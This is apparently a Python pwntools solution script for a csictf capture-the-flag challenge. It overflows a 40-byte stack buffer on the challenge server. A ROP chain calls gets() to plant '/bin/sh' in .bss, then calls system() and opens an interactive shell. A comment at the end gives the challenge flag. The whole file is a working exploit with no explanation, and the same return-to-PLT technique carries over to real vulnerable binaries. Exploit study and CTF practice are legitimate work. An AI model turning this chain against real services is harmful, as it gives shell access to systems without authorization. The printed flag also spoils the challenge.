from pwn import *

elf = ELF("pwn-intended-0x3")
rop = ROP(elf)
HOST = "chall.csivit.com"
PORT = 30013
p = remote(HOST, PORT)
offset = 32 + 8

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
bss = 0x4040a0
log.success('pop rdi; ret @ %s' % hex(POP_RDI))
log.info("sending the first payload")
payload = b"A" * offset + p64(POP_RDI) + p64(bss) + p64(elf.plt['gets']) + p64(elf.sym['main'])
p.recvline()
sleep(1)
p.sendline(payload)
p.sendline("/bin/sh\0")
log.success("done writing /bin/sh")

log.info("sending the second payload")
payload2 = b"A" * offset + p64(POP_RDI) + p64(bss) + p64(elf.plt['system'])
p.sendline(payload2)
p.recvuntil("Welcome to csictf! Time to teleport again.\n")
p.interactive()

# FLAG --> csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
